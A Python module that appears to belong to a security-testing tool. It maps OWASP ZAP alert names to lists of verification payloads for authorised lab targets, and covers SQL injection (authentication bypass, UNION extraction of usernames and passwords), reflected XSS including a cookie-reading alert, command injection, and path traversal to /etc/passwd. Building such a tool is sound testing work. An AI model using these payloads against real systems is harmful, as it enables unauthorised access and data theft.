"""
Payload suggestion engine.

Given a confirmed vulnerability class, suggests structured, ready-to-run
payloads a tester can use to re-verify the finding. Organised by category and
technique, each payload carrying a short explanation and a risk level.

For authorised testing only (OWASP Benchmark, Juice Shop, DVWA, ...), never
against systems without explicit permission.
"""
from __future__ import annotations

PAYLOADS: dict[str, dict[str, list[dict]]] = {
    "SQL Injection": {
        "Error-based": [
            {"payload": "' OR '1'='1", "note": "Bypass a simple WHERE clause", "risk": "high"},
            {"payload": "' OR '1'='1' --", "note": "Same, comments out the rest of the query", "risk": "high"},
            {"payload": "admin'--", "note": "Classic authentication bypass", "risk": "high"},
        ],
        "Boolean-blind": [
            {"payload": "' AND 1=1--", "note": "Expect a true response if vulnerable", "risk": "medium"},
            {"payload": "' AND 1=2--", "note": "Expect a false response (compare the two)", "risk": "medium"},
        ],
        "Time-blind": [
            {"payload": "' AND SLEEP(5)--", "note": "MySQL: response delayed if vulnerable", "risk": "medium"},
            {"payload": "'; WAITFOR DELAY '0:0:5'--", "note": "SQL Server delay", "risk": "medium"},
            {"payload": "' AND pg_sleep(5)--", "note": "PostgreSQL delay", "risk": "medium"},
        ],
        "Union-based": [
            {"payload": "' UNION SELECT NULL--", "note": "Find the number of columns", "risk": "high"},
            {"payload": "' UNION SELECT username, password FROM users--", "note": "Direct data extraction", "risk": "high"},
        ],
    },
    "Cross Site Scripting (Reflected)": {
        "Basic": [
            {"payload": "<script>alert(1)</script>", "note": "Basic JS execution test", "risk": "medium"},
            {"payload": "\"><script>alert(document.cookie)</script>", "note": "Break out of HTML context", "risk": "high"},
        ],
        "Filter bypass": [
            {"payload": "<img src=x onerror=alert(1)>", "note": "Event handler instead of <script>", "risk": "medium"},
            {"payload": "<svg onload=alert(1)>", "note": "SVG vector, bypasses basic filters", "risk": "medium"},
        ],
    },
    "Command Injection": {
        "Basic": [
            {"payload": "; id", "note": "Run a command after a ; separator", "risk": "high"},
            {"payload": "| whoami", "note": "Pipe to an identification command", "risk": "high"},
            {"payload": "$(id)", "note": "Modern command substitution", "risk": "high"},
        ],
        "Blind": [
            {"payload": "; sleep 5", "note": "Detect by response delay", "risk": "medium"},
            {"payload": "| ping -c 5 127.0.0.1", "note": "Delay via local ping (no external traffic)", "risk": "medium"},
        ],
    },
    "Path Traversal": {
        "Classic": [
            {"payload": "../../../etc/passwd", "note": "Directory traversal (Linux)", "risk": "high"},
            {"payload": "..\\..\\..\\windows\\win.ini", "note": "Directory traversal (Windows)", "risk": "high"},
        ],
        "Encoding bypass": [
            {"payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "note": "URL-encoded to bypass a naive filter", "risk": "high"},
        ],
    },
}

# Map a ZAP alert name to a payload category.
ALERT_TO_CATEGORY = {
    "SQL Injection": "SQL Injection",
    "SQL Injection - MySQL": "SQL Injection",
    "SQL Injection - Hypersonic SQL": "SQL Injection",
    "Cross Site Scripting (Reflected)": "Cross Site Scripting (Reflected)",
    "Cross Site Scripting (Persistent)": "Cross Site Scripting (Reflected)",
    "Remote OS Command Injection": "Command Injection",
    "Path Traversal": "Path Traversal",
}


def suggest(alert_name: str) -> dict[str, list[dict]]:
    """Return structured payloads for a ZAP alert name, or {} if none apply."""
    category = ALERT_TO_CATEGORY.get(alert_name)
    return PAYLOADS.get(category, {}) if category else {}


def categories() -> list[str]:
    return list(PAYLOADS.keys())
